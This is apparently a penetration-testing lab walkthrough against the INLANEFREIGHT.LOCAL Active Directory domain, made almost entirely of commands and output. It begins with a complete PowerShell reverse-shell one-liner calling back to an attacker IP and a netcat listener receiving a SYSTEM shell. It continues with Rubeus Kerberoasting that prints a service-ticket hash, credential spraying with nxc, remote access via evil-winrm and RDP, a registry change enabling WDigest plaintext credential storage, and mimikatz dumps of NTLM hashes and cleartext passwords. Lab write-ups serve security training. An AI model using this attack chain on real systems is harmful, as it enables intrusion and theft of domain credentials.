![](Attachments/Pasted%20image%2020260812194853.png)

```
PS> type C:\Users\Administrator\Desktop\flag.txt
```

Start a listener.
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.254',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
 nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.254] from (UNKNOWN) [10.129.202.242] 49747
whoami
nt authority\system

```

```
PS C:\Windows\Tasks> .\Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /user:mssqlsvc /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
[X] No results returned by LDAP!
[X] LDAP query failed, try specifying more domain information or specific SPNs.
PS C:\Windows\Tasks> .\Rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.inlanefreight.local:1433 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.


[*] Target SPN             : MSSQLSvc/SQL01.inlanefreight.local:1433
[*] Hash                   : $krb5tgs$23$*USER$DOMAIN$MSSQLSvc/SQL01.inlanefreight.local:1433*$5C4D438EFC32F39CB4D4CBD47D737005$BD163DDC08268F18CDB04F2C5F7EF7060CB272C10AC973F61F5CD0087DF617D326AC55923139DC3550A2D3F627BC6A34535044C7027259D9DE55916218C2D865AE971970EE8170CDD92780560E9C7310C97755F7A205559C5BEEAF4CA0B8C2350CB455917A90EF04DA9A0BE83596307098D827BABD936F29D386D0AA43BD0A8821AF51C16E3A2069CEFE37B6E182E8ED8432B3D4C866F58E3A0FD1C50C435F9E6B43189B63CBD1AAC4ECAAB683333526CBA8537CFD212E6FF21552B323F7146A9806A3CD71FE47EBC58C667537517D100B96D3090F0D14DBA574EF9928374EFE40408FF97046A121E5BDB78F419BEA35EEA863C0E836B131E8C4BD2F5340B72B896AFE288CF55BE03E660FFD2BF01842C6F1F2C6AA7FF1D2FD6F3B9A103F6ADAF9CD3F3ED7A73FFB860D997467A9901D6FBD2EE5DCF7218846BCF534646E0E5912EDC761A4E85F8C659FC987CC0E88022AFF2E6DA9677FD716CE2C026A9AE1DAAB1DDA48514FE1EA672CE188CD401EFE7116E9FF657AA5E5E2734D4244E2327E1B581BCBF2A6EEB6A576513C0C82910583FFCBA83DA2AAFFBFC79E786C949851334DB4C8590408343C7692EAB884F3741DB109891201D60D77236B328E9B1E6FB5BAEFDF7568584DCF1C0537BA78957EF564FE70E72A93C36BCC67F378752AC142F65D7008387DAB51597DDCEA38A68077278F90E3E224D7A3D24D547487C4286FE44EFC5A393DFD721181386B4CC0E0F62CB6BF1D6DE5578B96C1AE9487B01819CCE4049C9EC64316FAF8ACE53AFECD849875E9EC190BB4544C7F913B9B4915DE963874AFB5445AEBAACD8E06ED77F2C8341830150950BC01BD9D8235163CEFBFC6B95F0EDFD38BDE0C15AD11E3FA4FFE586E0698DFBE3C892818869513FE6CA64D3706168C319E023D20D592F0B0C9F1B74BEB93BB9A17499D24078974DF5B20755FE074E2B202652EB8987215284F559B6F7A2D96D67AD675527E74C9B0192D639DFADDEC3A2473B7C0159C1624CA8E27AABDBE2511E62EA2C27D8F8FCD2B74BD47A059686BDA34D60207A23756144ADAF99333CE1B22EB00626A439EE24642EA9025EC12B4100CB3657350C14C844B26F03B6C3E8E4A420F22C6C54E5C2436E9640ABAC9539A465DFE984CC0CBF8DD2AADE693178F4D7E966DDD2F65BFE5D533F31438A76E4D76CA88C5FA10040C2D2718EEB0C4EC607FDB847D652C89C0783513A56A4AE9D3F5D32B3C9F9071AB4EC075D76068C521D034A200CD0FF8E8F944E15B8C9E6864A4D8CF1DBB7F70039D1DA7EC3710BA8E5CC59B45E251F014E982579666F427E3BEF2465F1291B5B0DC883B9A37A6D0B0B437DB76909E0435EAE976FB9C7533E79A59BA2FC74EA13BDD440F3195DC4772F866AA6278C9E9A3526555EB039D110F185EA213E17621B98666F9E6FFBB760F6ED4984229C240C3455B983B5D92E1FD8E276184FA44C9E7199D36C099FE353227EDC8397269F9BA99B97E5377CC8737C74443471080DB3B75301503F56F30B4

PS C:\Windows\Tasks> 

```

```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
```

```
PS C:\Windows\Tasks> setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
        DNS/DC01.INLANEFREIGHT.LOCAL
        GC/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
        RestrictedKrbHost/DC01.INLANEFREIGHT.LOCAL
        RestrictedKrbHost/DC01
        RPC/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
        HOST/DC01/INLANEFREIGHT
        HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
        HOST/DC01
        HOST/DC01.INLANEFREIGHT.LOCAL
        HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/03d2eace-bb3d-467e-a00a-eab0dbfaa065/INLANEFREIGHT.LOCAL
        ldap/DC01/INLANEFREIGHT
        ldap/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
        ldap/DC01
        ldap/DC01.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        kadmin/changepw
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL02.inlanefreight.local:1433
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEVTEST.inlanefreight.local:1433
CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/QA001.inlanefreight.local:1433
CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local
CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=WEB-WIN01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
        RestrictedKrbHost/WEB-WIN01
        HOST/WEB-WIN01
        RestrictedKrbHost/WEB-WIN01.INLANEFREIGHT.LOCAL
        HOST/WEB-WIN01.INLANEFREIGHT.LOCAL
CN=MS01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
        tapinego/MS01
        tapinego/MS01.INLANEFREIGHT.LOCAL
        TERMSRV/MS01
        TERMSRV/MS01.INLANEFREIGHT.LOCAL
        WSMAN/MS01
        WSMAN/MS01.INLANEFREIGHT.LOCAL
        RestrictedKrbHost/MS01
        HOST/MS01
        RestrictedKrbHost/MS01.INLANEFREIGHT.LOCAL
        HOST/MS01.INLANEFREIGHT.LOCAL

Existing SPN found!

```


DC IP 

```
PS C:\Windows\Tasks> [System.Net.Dns]::GetHostAddresses("INLANEFREIGHT.LOCAL").IPAddressToString
172.16.6.3
PS C:\Windows\Tasks> 

```

Setup a ligolo proxy

find which ip is MS01
```
nxc smb 172.16.6.0/24 -u 'svc_sql' -p 'lucky7' -d INLANEFREIGHT.LOCAL
 
SMB                      172.16.6.100    445    WEB-WIN01        [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB-WIN01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
SMB                      172.16.6.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB                      172.16.6.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
SMB                      172.16.6.100    445    WEB-WIN01        [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7
SMB                      172.16.6.3      445    DC01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7
SMB                      172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```


```
└─$ nslookup MS01.INLANEFREIGHT.LOCAL 172.16.6.3
Server:         172.16.6.3
Address:        172.16.6.3#53

Name:   MS01.INLANEFREIGHT.LOCAL
Address: 172.16.6.50


```

```
evil-winrm -i 172.16.6.50 -u 'svc_sql' -p 'lucky7'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_sql.INLANEFREIGHT\Documents>
```

```
xfreerdp /v:172.16.6.50 /u:'svc_sql' /p:'lucky7' /d:INLANEFREIGHT.LOCAL /dynamic-resolution
```


```

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # logonpasswords
ERROR mimikatz_doLocal ; "logonpasswords" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 253955 (00000000:0003e003)
Session           : Interactive from 1
User Name         : tpetty
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/12/2026 11:48:15 PM
SID               : S-1-5-21-2270287766-1317258649-2146029398-4607
        msv :
         [00000003] Primary
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
         * SHA1     : 38afea42a5e28220474839558f073979645a1192
         * DPAPI    : da2ec07551ab1602b7468db08b41e3b2
```

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown.exe /r /t 0 /f
```

```

PS C:\Users\Public> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 251476 (00000000:0003d654)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/13/2026 12:56:04 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : MS01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        ssp :
        credman :

Authentication Id : 0 ; 249679 (00000000:0003cf4f)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/13/2026 12:56:04 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : MS01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        ssp :
        credman :

Authentication Id : 0 ; 188782 (00000000:0002e16e)
Session           : Interactive from 1
User Name         : tpetty
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/13/2026 12:55:57 AM
SID               : S-1-5-21-2270287766-1317258649-2146029398-4607
        msv :
         [00000003] Primary
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
         * SHA1     : 38afea42a5e28220474839558f073979645a1192
         * DPAPI    : da2ec07551ab1602b7468db08b41e3b2
        tspkg :
        wdigest :
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * Password : Sup3rS3cur3D0m@inU2eR
        kerberos :
         * Username : tpetty
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 55672 (00000000:0000d978)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:48 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : MS01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        ssp :
        credman :

Authentication Id : 0 ; 55652 (00000000:0000d964)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:48 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : MS01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        ssp :
        credman :

Authentication Id : 0 ; 288599 (00000000:00046757)
Session           : RemoteInteractive from 2
User Name         : svc_sql
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/13/2026 12:56:07 AM
SID               : S-1-5-21-2270287766-1317258649-2146029398-4608
        msv :
         [00000003] Primary
         * Username : svc_sql
         * Domain   : INLANEFREIGHT
         * NTLM     : dc3ba1d16d82ac977eea8c22c5de3f82
         * SHA1     : c052c598aaed303e20658a4a6341320867d8dcc4
         * DPAPI    : 32d87218d6331c60d8448418e504b7df
        tspkg :
        wdigest :
         * Username : svc_sql
         * Domain   : INLANEFREIGHT
         * Password : lucky7
        kerberos :
         * Username : svc_sql
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 34771 (00000000:000087d3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:47 AM
SID               :
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:47 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : ms01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 287907 (00000000:000464a3)
Session           : RemoteInteractive from 2
User Name         : svc_sql
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/13/2026 12:56:07 AM
SID               : S-1-5-21-2270287766-1317258649-2146029398-4608
        msv :
         [00000003] Primary
         * Username : svc_sql
         * Domain   : INLANEFREIGHT
         * NTLM     : dc3ba1d16d82ac977eea8c22c5de3f82
         * SHA1     : c052c598aaed303e20658a4a6341320867d8dcc4
         * DPAPI    : 32d87218d6331c60d8448418e504b7df
        tspkg :
        wdigest :
         * Username : svc_sql
         * Domain   : INLANEFREIGHT
         * Password : lucky7
        kerberos :
         * Username : svc_sql
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : INLANEFREIGHT
